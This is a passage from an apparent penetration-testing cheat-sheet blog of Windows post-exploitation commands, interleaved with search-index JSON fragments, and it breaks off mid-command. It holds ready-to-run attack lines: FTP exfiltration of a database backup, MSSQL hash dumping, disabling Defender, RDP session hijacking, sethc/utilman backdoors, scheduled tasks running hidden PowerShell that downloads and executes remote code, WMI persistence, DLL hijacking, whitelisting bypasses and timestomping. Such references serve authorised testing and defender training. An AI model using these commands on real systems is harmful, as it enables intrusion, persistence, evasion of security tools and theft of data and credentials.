1 2 3 4 5 6 echo open 10 . 1 . 2 . 3 > C : \\ script . txt echo user myftpuser >> C : \\ script . txt echo pass myftppass >> C : \\ script . txt echo put E : \\ backups \\ database . dbf >> C : \\ script . txt echo bye >> C : \\ script . txt ftp - s : script . txt WMI call remote system 1 wmic / node : remote_computer process call create \"netstat.exe -ano > C:\\output.txt\" WMI get startup items 1 wmic startup get Caption , Command , User or 1 wmic startup list full WMI get enabled account password expiration 1 wmic useraccount where \"disabled=0 AND localaccount=1\" get name , passwordexpires / value View established connections of current machine: 1 netstat - a - n - p tcp | find \"ESTAB\" View open ports of current machine: 1 netstat - a - n - p tcp | find \"LISTEN\" 1 netstat - a - n - p udp View network configuration: 1 2 3 netsh interface ip show addresses netsh interface ip show route netsh interface ip show neighbors View current network shares: 1 net share Mount a remote share with the rights of the current user: 1 net use K : \\\\ 10 . 1 . 2 . 3 \\ C $ Enable Remote Desktop: 1 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" / v fDenyTSConnections / t REG_DWORD / d 0 / f One-Liner Windows Enumeration Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7 1 whoami & hostname & ipconfig / all & net user / domain 2 >& 1 & net group / domain 2 >& 1 & net group \"domain admins\" / domain 2 >& 1 & net group \"Exchange Trusted Subsystem\" / domain 2 >& 1 & net accounts / domain 2 >& 1 & net user 2 >& 1 & net localgroup administrators 2 >& 1 & netstat - an 2 >& 1 & tasklist 2 >& 1 & sc query 2 >& 1 & systeminfo 2 >& 1 & reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" 2 >& 1 & net view & net view / domain & net user % USERNAME % / domain & nltest / dclist & gpresult / z Check for unquoted service paths 1 wmic service get name , displayname , pathname , startmode | findstr / i / v \"c:\\windows\\\\\" | findstr / i / v \"\" \" or 1 gwmi win32_service | Select pathname | Where { ( $ _ . pathname - ne $ null ) } | Where { - not $ _ . pathname . StartsWith ( \"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\" . \") +4)) -match \" . * . * \"} Change Windows Proxy Settings 1 2 3 4 5 6 7 8 9 10 11 12 13 Command to enable proxy usage : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyEnable / t REG_DWORD / d 1 / f Command to disable proxy usage : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyEnable / t REG_DWORD / d 0 / f Command to change the proxy address : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyServer / t REG_SZ / d proxyserveraddress : proxyport / f Also , in this case , it is a per - user setting than a system - wide setting . Mount a .win image remotely on target machine 1 2 3 4 5 6 7 8 9 10 Dism / get - wiminfo / wimfile : z : \\ win7 \\ Acme_Win7 . wim Boot Dir Dism / Mount - Wim / WimFile : z : \\ win7 \\ Acme_Win7 . wim / index : 1 / MountDir : C : \\ windows \\ temp \\ offline C : Drive Dism / Mount - Wim / WimFile : z : \\ win7 \\ Acme_Win7 . wim / index : 2 / MountDir : C : \\ windows \\ temp \\ offline Dism / UnMount - Wim / MountDir : C : \\ windows \\ temp \\ offline / discard For loop example 1 for / D % f in ( \" C:\\Users\\username\\* \" ) do dir % f For loop, count lines 1 for / R \" C:\\users\\username\\desktop \" % f in ( * ) do find / c / v \"\" % f Check if file is locked 1 @echo off ; 2 > nul ( >> file . txt echo off ) && ( echo not locked ) || ( echo locked ) Lock a file for testing 1 ( >& 2 pause ) >> file . txt","title":"Built-in Commands"},{"location":"blogs/2019/penetration-testing-pasties/#dsquery","text":"Get attributes for all Windows hosts in the Domain 1 dsquery * - filter \"(&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))\" - limit 0 | dsget computer - dn - samid - desc - loc > c : \\ windows \\ temp \\ computers . log Get attributes for computers in a specific OU 1 dsquery computer < OU = PUT OU HERE > - limit 0 | dsget computer - dn - samid - desc - l > c : \\ windows \\ temp \\ out . log Get attributes for users in the specified OU 1 dsquery user < OU = PUT OU HERE > - limit 0 | dsget user - dn - samid - display - desc - office - tel - email - title - hmdir - profile - loscr - mustchpwd - canchpwd - pwdneverexpires - disabled Get DC 1 dsquery server - forest or 1 dsquery server - o rdn - forest Get Domain Functional Level 1 dsquery * \"DC=corp,DC=test,DC=com\" - scope base - attr msDS - Behavior - Version ntMixedDomain Get Forest Functional Level 1 dsquery * \"CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com\" - scope base - attr msDS - Behavior - Version ntMixedDomain","title":"DSQUERY"},{"location":"blogs/2019/penetration-testing-pasties/#sqlcmd","text":"List Databases 1 sqlcmd - E - S localhost - Q \" EXEC sp_databases; \" List Tables in Database 1 sqlcmd - E - S localhost - Q \"SELECT * FROM DatabaseName.information_schema.tables;\" - W - w 999 - s \",\" - o \"c:\\windows\\temp\\RecruiterProd_MSCRM_tables.csv\" Retrieve table contents 1 sqlcmd - E - S localhost - d DatabaseName - Q \"SELECT * FROM SystemUserBase;\" - W - w 999 - s \",\" - o \"c:\\windows\\temp\\RecruiterProd_MSCRM_userbase.csv\" Dump MSSQL Password Hashes 1 sqlcmd - E - S localhost - Q \"SELECT name, password_hash FROM master.sys.sql_logins;\"","title":"SQLCMD"},{"location":"blogs/2019/penetration-testing-pasties/#ntdsutil","text":"Built-in utility to create backup copy of the AD database 1 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q","title":"NTDSUTIL"},{"location":"blogs/2019/penetration-testing-pasties/#applocker","text":"List Applocker's effective policy on the system 1 Get - ApplockerPolicy - Effective","title":"Applocker"},{"location":"blogs/2019/penetration-testing-pasties/#windows-defender","text":"Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender) 1 c : \\ program files \\ windows defender \\ mpcmdrun . exe \" - RemoveDefinitions - All Set - MpPreference - DisableIOAVProtection $ true","title":"Windows Defender"},{"location":"blogs/2019/penetration-testing-pasties/#appcmd","text":"Get virtual directories in IIS 1 c : \\ windows \\ system32 \\ inetsrv \\ appcmd . exe list vdir / text : physicalpath","title":"APPCMD"},{"location":"blogs/2019/penetration-testing-pasties/#windows-lateral-movement","text":"RDP Hijacking If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command. Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command. RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # View RDP sessions on system your RDP ' d to with administrative permissions # Locally quser # Remote quser / server : < servername > # Create a service that will swap your SESSIONNAME with the desired disconnected session sc create sesshijack binpath = \"cmd.exe /k tscon 1 /dest:rdp-tcp#XX\" error = \"ignore\" # Start service net start sesshijack or sc start sesshijack Linux to Windows Remoting In windows run 1 2 winrm set winrm / config / Service / Auth @ { Basic = \"true\" } winrm set winrm / config / Service @ { AllowUnencrypted = \"true\" } In linux run 1 2 $ cred = Get - Credential Enter - PSSession - ComputerName 'winserver1' - Credential $ cred - Authentication Basic PowerShell Remoting over SSH 1 Enter - PSSession - Hostname < IP or FQDN > - Username james - SSHTransport","title":"Windows Lateral Movement"},{"location":"blogs/2019/penetration-testing-pasties/#windows-persistence-methods","text":"","title":"Windows Persistence Methods"},{"location":"blogs/2019/penetration-testing-pasties/#registry-keys","text":"","title":"Registry Keys"},{"location":"blogs/2019/penetration-testing-pasties/#modify-registry-keys","text":"1 2 3 4 5 # Add a key / value reg add \\\\ < systemname > \\ < KEY > / v \"<value>\"\" /t <type (Binary,REG_SZ,etc)> /d <data> #Delete a key/value reg delete \\\\<systemname>\\<KEY> /v \" < value > \"","title":"Modify registry keys"},{"location":"blogs/2019/penetration-testing-pasties/#userinit-key","text":"This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\\windows\\system32\\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma. 1 2 HKEY_LOCAL_MACHINE \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon \\ Userinit HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon \\ Userinit = ( REG_SZ ) C : \\ windows \\ system32 \\ userinit . exe , c : \\ windows \\ badprogram . exe","title":"Userinit Key"},{"location":"blogs/2019/penetration-testing-pasties/#run-key","text":"1 2 3 4 5 6 7 # System Wide HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ RunOnce # Current Logged - On User Only HKEY_CURRENT_USER \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKEY_CURRENT_USER \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ RunOnce","title":"Run Key"},{"location":"blogs/2019/penetration-testing-pasties/#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run","text":"1 HKLM \\ Software \\ MS \\ WindowsNT \\ CurrentVersion \\ Image File Execution Options \\ notepad . exe \\ debugger ( REG_SZ = cmd . exe )","title":"List Image File Execution Options (Debugger file executed when the target file is run)"},{"location":"blogs/2019/penetration-testing-pasties/#appinit_dlls","text":"Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV! This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system. 1 HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Windows \\ AppInit_DLLs","title":"AppInit_DLLs"},{"location":"blogs/2019/penetration-testing-pasties/#no-reboot-sethcutilman-option-using-a-debugger-key","text":"Navigate to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ Make key called \"sethc.exe\" Make a REG_SQ value called \"Debugger\" Assign it \"c:\\windows\\system32\\cmd.exe\" as the value Hit SHIFT 5 times and get a shell as nt authority\\system 1 2 reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" / v Debugger / t REG_SZ / d \"c:\\windows\\system32\\cmd.exe\" reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" / v Debugger / t REG_SZ / d \"c:\\windows\\system32\\cmd.exe\" Remove the debugger key 1 2 reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" / f reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" / f","title":"No-reboot sethc/utilman option using a \"debugger\" key"},{"location":"blogs/2019/penetration-testing-pasties/#file-storage-locations","text":"","title":"File Storage Locations"},{"location":"blogs/2019/penetration-testing-pasties/#startup-folders","text":"1 2 3 4 5 6 7 8 9 10 11 # All Users - Windows XP C : \\ Documents and Settings \\ All Users \\ Start Menu \\ Programs \\ Startup # All Users - Windows Vista + C : \\ ProgramData \\ Microsoft \\ Windows \\ Start Menu \\ Programs \\ Startup # User Profile - Windows XP C : \\ Documents and Settings \\ < USERNAME > \\ Start Menu \\ Programs \\ Startup # User Profile - Windows Vista + C : \\ Users \\ < USERNAME > \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ Start Menu \\ Programs \\ Startup","title":"Startup Folders"},{"location":"blogs/2019/penetration-testing-pasties/#sethcutilman-replacement","text":"Replace these binaries, may require a reboot to take effect 1 2 %WINDIR%\\System32\\sethc.exe %WINDIR%\\System32\\utilman.exe Hit shift 5 times = sethc.exe run by SYSTEM Windows key + U = utilman.exe run by SYSTEM","title":"SETHC/UTILMAN Replacement"},{"location":"blogs/2019/penetration-testing-pasties/#volume-shadow-copy-restore-points","text":"Windows service that's constantly running - takes snapshots of system directories Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware Registry Key to Disable Volume Shadow Copy 1 HKLM \\ System \\ CurrentControlSet \\ Control \\ BackupRestore \\ FilesNotToSnapshot","title":"Volume Shadow Copy (Restore Points)"},{"location":"blogs/2019/penetration-testing-pasties/#vssadmin-native-windows-utility","text":"vssadmin create command only applies to Server OS (Win2k3,2008) 1 2 3 4 5 vssadmin list shadows vssadmin create shadow / for = C : wmic / node : DC1 / user : DOMAIN \\ domainadminsvc / password : domainadminsvc123 process call create \" cmd /c vssadmin create shadow /for=C mklink / D C :\\ VscAccess \\\\?\\ GLOBALROOT \\ Device \\ HardDiskVolumeShadowCopy1 copy \\\\?\\ GLOBALROOT \\ Device \\ HardDiskVolumeShadowCopy4 \\ path \\ to \\ some \\ file e :\\ files","title":"VSSADMIN - native windows utility"},{"location":"blogs/2019/penetration-testing-pasties/#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy","text":"1 wmic process call create \\\\ . \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ system32 \\ evil . exe This process will not show the imagename (executable filename) or commandline parameters in the task list. The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it. 1 2 root @kali : ~ # wmis - U DOMAIN \\ domainadminsvc % domainadminsvc123 // ServerName \\\\ ? \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ Windows \\ system32 \\ evil . exe NTSTATUS : NT_STATUS_OK - Success In Kali Linux you could use the WMIS package to do the same thing: 1 2 wmis - U DOMAIN \\ domainadminsvc % domainadminsvc123 // ServerName \\\\ ? \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ Windows \\ system32 \\ evil . exe NTSTATUS : NT_STATUS_OK - Success","title":"Use WMIC process call to run an .exe from a Volume Shadow Copy"},{"location":"blogs/2019/penetration-testing-pasties/#task-scheduling","text":"","title":"Task Scheduling"},{"location":"blogs/2019/penetration-testing-pasties/#at","text":"Executes as system and must be an Admin to run it. Check groups with whoami /groups 1 2 3 4 5 at 13 : 20 / interactive cmd net user \\\\ target / user : Domain \\ user pass net time \\\\ target at \\\\ target 13 : 20 c : \\ temp \\ evil . bat","title":"AT"},{"location":"blogs/2019/penetration-testing-pasties/#schtasks","text":"Any user can create a task Schedule a binary to run with arguments on system events 1 2 3 4 5 6 7 8 9 10 11 # On System Startup schtasks / create / TN OfficeUpdaterA / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onstart / RU system / RL HIGHEST schtasks / create / TN OfficeUpdaterD / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onstart / RU system / RL HIGHEST # On User Login schtasks / create / TN OfficeUpdaterB / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onlogon schtasks / create / TN OfficeUpdaterE / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onlogon # On Idle schtasks / create / TN OfficeUpdaterC / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onidle / i 30 '''' schtasks / create / TN OfficeUpdaterF / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onidle / i 60 Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\\windows\\misc\\psh_web_delivery' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # ( X86 ) - On User Login schtasks / create / tn OfficeUpdaterA / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onlogon / ru System # ( X86 ) - On System Start schtasks / create / tn OfficeUpdaterB / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onstart / ru System # ( X86 ) - On User Idle ( 30 mins ) schtasks / create / tn OfficeUpdaterC / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onidle / i 30 # ( X64 ) - On User Login schtasks / create / tn OfficeUpdaterA / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onlogon / ru System # ( X64 ) - On System Start schtasks / create / tn OfficeUpdaterB / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onstart / ru System # ( X64 ) - On User Idle ( 30 mins ) schtasks / create / tn OfficeUpdaterC / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'\" / sc onidle / i 30","title":"SCHTASKS"},{"location":"blogs/2019/penetration-testing-pasties/#additional-notes","text":"Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (\"): Delete scheduled task without prompting 1 schtasks / delete / f / TN taskname Detailed scheduled tasks listing 1 schtasks / query / V / FO list View scheduled tasks log (for troubleshooting) 1 2 3 notepad c : \\ windows \\ schedlgu . txt ( Windows XP ) notepad c : \\ windows \\ tasks \\ schedlgu . txt ( Vista + )","title":"Additional Notes"},{"location":"blogs/2019/penetration-testing-pasties/#windows-service","text":"1 2 3 sc query sc create < \\\\ Target ( optional ) > < servicename > binPath = < service binary path > type = share start = auto DisplayName = < display name > sc delete < servicename >","title":"Windows Service"},{"location":"blogs/2019/penetration-testing-pasties/#dll-hijacking","text":"Order of DLL Loading 1 2 3 4 5 6 1 . The directory from which the application is loaded 2 . The current directory 3 . The system directory , usually C : \\\\ Windows \\\\ System32 \\\\ ( The GetSystemDirectory function is called to obtain this directory .) 4 . The 16 - bit system directory - There is no dedicated function to retrieve the path of this directory , but it is searched as well . 5 . The Windows directory . The GetWindowsDirector function is called to obtain this directory . 6 . The directories that are listed in the PATH environment variable . Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex. Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/ On Windows 7 there are three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : \\ windows \\ ehome \\ Mcx2Prov . exe C : \\ Windows \\ ehome \\ CRYPTBASE . dll C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ Windows \\ System32 \\ sysprep \\ CRYPTSP . dll C : \\ windows \\ System32 \\ sysprep \\ CRYPTBASE . dll C : \\ Windows \\ System32 \\ sysprep \\ RpcRtRemote . dll C : \\ Windows \\ System32 \\ sysprep \\ UxTheme . dll C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL On Windows 8 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ windows \\ System32 \\ sysprep \\ CRYPTBASE . dll C : \\ Windows \\ System32 \\ Sysprep \\ dwmapi . dll C : \\ Windows \\ System32 \\ Sysprep \\ SHCORE . dll C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL C : \\ windows \\ System32 \\ pwcreator . exe C : \\ Windows \\ System32 \\ vds . exe C : \\ Windows \\ System32 \\ UReFS . DLL Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 12 13 14 C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ Windows \\ System32 \\ Sysprep \\ SHCORE . dll C : \\ Windows \\ System32 \\ Sysprep \\ OLEACC . DLL C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL C : \\ windows \\ System32 \\ pwcreator . exe C : \\ Windows \\ System32 \\ vds . exe C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ CRYPTBASE . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ CRYPTSP . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ dwmapi . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ USERENV . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ OLEACC . dll","title":"DLL-Hijacking"},{"location":"blogs/2019/penetration-testing-pasties/#linkinfodll-replacement","text":"Windows explorer in older systems loads linkinfo.dll from c:\\windows over c:\\windows\\system32 if it exists 1 copy evil . dll c : \\ windows \\ linkinfo . dll","title":"linkinfo.dll Replacement"},{"location":"blogs/2019/penetration-testing-pasties/#wmi-event-persistence-via-powershell","text":"WMI Event persistence explained, you can find a bloated version in powersploit. Three parts to this: * WMI Event Filter * Event Consumer * Filter/Consumer Binding This technique gets you SYSTEM level persistence, requires admin rights to execute. Autoruns doesn't even check for this yet. (doubt any AVs are either) Difficult to detect, Difficult to remove if you dont know what youre doing.","title":"WMI Event Persistence via Powershell"},{"location":"blogs/2019/penetration-testing-pasties/#wmi-event-filter","text":"Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing) 1 2 3 4 5 6 7 $ EventFilter = ( [ WMICLASS ] \"\\\\.\\root\\subscription:__EventFilter\" ). CreateInstance () $ EventFilter . QueryLanguage = \"WQL\" $ EventFilter . Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\" $ EVentFilter . EventNamespace = \"root\\cimv2\" $ EventFilter . Name = \"OBVIOUSHACKER\" $ Result = $ EventFilter . Put () $ Filter = $ Result . Path http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx","title":"WMI Event Filter"},{"location":"blogs/2019/penetration-testing-pasties/#event-consumer","text":"Configure what to execute once the event occurs. Current example is just a ping. 1 2 3 4 5 6 $ InstanceConsumer = ( [ wmiclass ] \"\\\\.\\root\\subscription:CommandLineEventConsumer\" ). CreateInstance () $ InstanceConsumer . Name = \"OBVIOUSHACKER\" $ InstanceConsumer . CommandLineTemplate = \"ping 127.0.0.1 -n 100\" #CMD TO EXECUTE HERE $ InstanceConsumer . WorkingDirectory = \"C:\\\\windows\\\\system32\" $ Result = $ InstanceConsumer . Put () $ Consumer = $ Result . Path http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx","title":"Event Consumer"},{"location":"blogs/2019/penetration-testing-pasties/#filterconsumer-binding","text":"This is the object that correlates the Filter with the Consumer. Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service. 1 2 3 4 $ InstanceBinding = ( [ wmiclass ] \"\\\\.\\root\\subscription:__FilterToConsumerBinding\" ). CreateInstance () $ InstanceBinding . Filter = $ Filter $ InstanceBinding . Consumer = $ Consumer $ Result = $ InstanceBinding . Put () http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx","title":"Filter/Consumer Binding"},{"location":"blogs/2019/penetration-testing-pasties/#removal","text":"The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example) 1 2 3 Get - WmiObject __eventFilter - namespace root \\ subscription - filter \"name='OBVIOUSHACKER'\" | Remove - WmiObject Get - WmiObject CommandLineEventConsumer - Namespace root \\ subscription - filter \"name='OBVIOUSHACKER'\" | Remove - WmiObject Get - WmiObject __FilterToConsumerBinding - Namespace root \\ subscription | Where - Object { $ _ . filter - match 'OBVIOUSHACKER' } | Remove - WmiObject Some more detailed information on the subject http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/","title":"REMOVAL"},{"location":"blogs/2019/penetration-testing-pasties/#malicious-outlook-rules","text":"https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/ Ruler https://github.com/sensepost/ruler","title":"Malicious Outlook Rules"},{"location":"blogs/2019/penetration-testing-pasties/#windows-remote-management-winrm-psremoting","text":"Listens on 5985/5986 by default and allows interactive shell access over HTTP/S Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module) Metasploit has multiple modules for locating the service and gaining shells over WinRM Connect to a remote host with WinRM from local Windows host 1 2 3 4 5 6 Enable - PSRemoting Set - Item - Path WSMan : \\ localhost \\ Client \\ TrustedHosts * - force or Set - Item - Path WSMan : \\ localhost \\ Client \\ TrustedHosts - value \"<host>\" - Force $ cred = Get - Credential Invoke - Command - ComputerName < host > - ScriptBlock { gci c : \\ } - credential $ cred","title":"Windows Remote Management (WinRM) / PSRemoting"},{"location":"blogs/2019/penetration-testing-pasties/#uninstall-a-patch-to-leave-the-system-vulnerable","text":"1 wusa . exe / uninstall / kb : 976932","title":"Uninstall a patch to leave the system vulnerable"},{"location":"blogs/2019/penetration-testing-pasties/#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords","text":"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html","title":"Create custom DLL for password filters and install on DC to capture changed passwords"},{"location":"blogs/2019/penetration-testing-pasties/#application-whitelisting-bypass-techniques","text":"SubTee Collection of Whitelist Bypass Techniques https://bitbucket.org/jsthyer/wevade.git Version .0.0.3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 1. IEExec - This technique may work in certain environments . Its relies on the fact that many organizations trust executables signed by Microsoft . We can misuse this trust by launching a specially crafted . NET application . Example Here : https : // room362 . com / post / 2014 / 2014 - 01 - 16 - application - whitelist - bypass - using - ieexec - dot - exe / 2. Rundll32 . exe 3. ClickOnce Applications dfsvc . exe dfshim . dll 4. XBAP - XML Browser Applications WPF PresentationHost . exe 5. MD5 Hash Collision http : // www . mathstat . dal . ca /~ selinger / md5collision / 6. PowerShell - Specifically Reflective Execution http : // clymb3r . wordpress . com / 2013 / 04 / 06 / reflective - dll - injection - with - powershell / https : // www . defcon . org / images / defcon - 21 / dc - 21 - presentations / Bialek / DEFCON - 21 - Bialek - PowerPwning - Post - Exploiting - by - Overpowering - Powershell . pdf 7. . HTA Application Invoke PowerShell Scripts Launched by mshta . exe , bypasses IE security settings as well . 8. bat , vbs , ps1 1. cmd . exe / k < script . txt 2. cscript . exe // E : vbscript script . txt 3. Get - Content script . txt | iex 9. Malicious Troubleshooting packs - MSDT . exe Reference : http : // cybersyndicates . com / 2015 / 10 / a - no - bull - guide - to - malicious - windows - trouble - shooting - packs - and - application - whitelist - bypass / Thanks to @nberthaume , @Killswitch_GUI 10. InstallUtil . exe A signed MS binary that loads assemblies and executes - One of the best . Examples here : https : // gist . github . com / subTee 11. Regsvcs / Regasm See : https : // gist . github . com / subTee / fb09ef511e592e6f7993 These 2 are Excellent . 12. regsvr32 . exe https : // gist . github . com / subTee / 24 c7d8e1ff0f5602092f58cbb3f7d302 This one is just simply amazing ... regsvr32 / s / n / u / i : http : // example . com / file . sct scrobj . dll 13. Msbuild . exe http : // subt0x10 . blogspot . com / 2016 / 09 / bypassing - application - whitelisting . html","title":"Application Whitelisting Bypass Techniques"},{"location":"blogs/2019/penetration-testing-pasties/#certutil","text":"https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46 File download 1 certutil - urlcache - split - f http : // example . com / file","title":"Certutil"},{"location":"blogs/2019/penetration-testing-pasties/#active-directory-enumeration","text":"","title":"Active Directory Enumeration"},{"location":"blogs/2019/penetration-testing-pasties/#adfind","text":"www.joeware.net/freetools/tools/adfind/ 1 2 3 4 5 AdFind . exe - u account @domain . com - up password - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=computer\" > domain_computers . txt AdFind . exe - u account @domain . com - up password - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=computer\" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light . txt AdFind . exe - u account @domain . com - up pass - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=user\" samaccountname description pwdlastset orclcommonattribute > domain_users_light . txt","title":"Adfind"},{"location":"blogs/2019/penetration-testing-pasties/#powershell","text":"List help for cmdlet: Get - Help [ cmdlet ] - full List available properties and methods: Get - Member For-each loop: ForEach - Object { $ _ } Search for string (like grep): Select - String - path [ file ] - pattern [ string ] Timestomp 1 2 3 4 5 $ file =( gi c : \\ file . exe ); $ date = '01/03/2009 12:12 pm' ; $ file . LastWriteTime =$ date ; $ file . LastAccessTime =$ date ; $ file . CreationTime =$ date Show last system boot time 1 Get-WmiObject win32_operatingsystem | select csname, @ { LABEL = 'LastBootUpTime' ; 